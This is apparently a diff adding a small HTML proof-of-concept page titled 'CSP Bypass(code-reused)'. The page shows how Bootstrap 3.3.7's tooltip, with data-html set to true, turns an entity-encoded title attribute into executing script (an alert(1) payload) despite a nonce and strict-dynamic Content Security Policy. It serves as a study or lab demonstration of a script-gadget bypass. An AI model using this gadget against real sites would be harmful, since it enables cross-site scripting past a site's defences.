@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv=content-security-policy content="style-src maxcdn.bootstrapcdn.com; script-src 'nonce-secret123' 'strict-dynamic'; "> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css"></link>
+    <script nonce="secret123" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script nonce="secret123" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.js"></script>
+
+</head>
+<body>
+    <script nonce="secret123">
+            $("[data-toggle=tooltip]").tooltip();
+    </script>
+    <div data-toggle=tooltip data-html=true title='&#60;script&#62;alert(1)&#60;/script&#62;'>aaa</div>
+</body>
+</html>
